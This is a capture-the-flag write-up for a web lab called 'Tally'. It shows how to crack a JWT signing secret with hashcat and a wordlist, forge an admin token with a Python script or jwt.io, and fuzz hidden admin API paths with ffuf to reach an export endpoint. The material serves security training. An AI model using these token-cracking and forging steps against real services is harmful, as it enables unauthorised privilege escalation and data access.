# Tally

### Lab Link
[WebVerse - Tally](https://dashboard.webverselabs-pro.com/foundational-labs/tally)

---

### Skills & Knowledge
- JWT API
- hashcat
- Forging token via Authorization: Bearer
- ffuf hidden paths

---
Inside the dashboard of my created account an `Authorization: Bearer` identifies my access

![alt text](/Writeups/images/Tallyimage-1.png)

API Token is
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjMsImVtYWlsIjoidW5rbm93bkBlbWFpbC5jb20iLCJuYW1lIjoidW5rbm93biIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzg1OTUwNDA4LCJleHAiOjE3ODY1NTUyMDh9.R4-_o_VPyW8dlgxy4ZYCbDwN010Nb94kp_p_zLLFxE8
```

![alt text](/Writeups/images/Tallyimage.png)

#### The Visual Signature (What it looks like)

> A standard JWT consists of three Base64Url-encoded strings separated by dots `.`
It always follows this exact format:  $$\text{header}.\text{payload}.\text{signature}$$

---
This can be view by using the `Convert` > `Base64 Decode` in Caido

#### Header

![alt text](/Writeups/images/Tallyimage-2.png)

#### Payload

![alt text](/Writeups/images/Tallyimage-3.png)

And the `Signature` cannot be decode. In order to know this we will need to Crack the JWT using `hashcat` `16500` 
> `-m 16500` Specifies the hash mode. Mode 16500 tells Hashcat specifically to target a JWT (JSON Web Token) HMAC-SHA256 hash. It will attempt to crack the secret key used to sign the token.

First we put the token we have in a file.

```
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjMsImVtYWlsIjoidW5rbm93bkBlbWFpbC5jb20iLCJuYW1lIjoidW5rbm93biIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzg1OTUwNDA4LCJleHAiOjE3ODY1NTUyMDh9.R4-_o_VPyW8dlgxy4ZYCbDwN010Nb94kp_p_zLLFxE8" > token.txt

```

Next we crack it using hashcat -m 16500 and wordlist we have.

```
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```
Now we can see that the signature is `tally123`

![alt text](/Writeups/images/Tallyimage-4.png)

---

## We have two ways in forging the token

### Option 1: using JWT in python3

Create a file in `.py` and forging our token, by changing the from `user` to `admin` and putting the `signature` as `tally123`

```
nano forge.py
```

```
import jwt

payload = {
  "sub": 3,
  "email": "unknown@email.com",
  "name": "unknown",
  "role": "admin",
  "iat": 1785950408,
  "exp": 1786555208
}

token = jwt.encode(payload, "tally123", algorithm="HS256")

print("JWT Token:\n", token)
```
Now here is the new JWT Token which now can put in the `Authorization: Bearer`

![alt text](/Writeups/images/Tallyimage-5.png)

---

### Option 2: JWT Debug Tool

Another easy way is to use the tool [JWT Web Token Debugger](https://www.jwt.io/)

First we put the token we have in the `JWT Decoder`

![alt text](/Writeups/images/Tallyimage-6.png)

then we switched to `JWT Encoder` and change the `Sign JWT` to `tally123` and `role` to `admin`.

#### Now we get the same result as earlier just a fastest way once the `Signature` has been cracked.

![alt text](/Writeups/images/Tallyimage-7.png)

---

## Enumeration

Now we do some `directory enumeration` to see `hidden path`.

```
ffuf -u http://tally.local/api/admin/FUZZ -w /usr/share/wordlists/dirb/big.txt
```
![alt text](/Writeups/images/Tallyimage-9.png)

Change the `path` to `/api/admin/exports` and replace the `Authorization: Bearer` to the newly token that was `forged`

![alt text](/Writeups/images/Tallyimage-8.png)

> The Flag has been Captured.
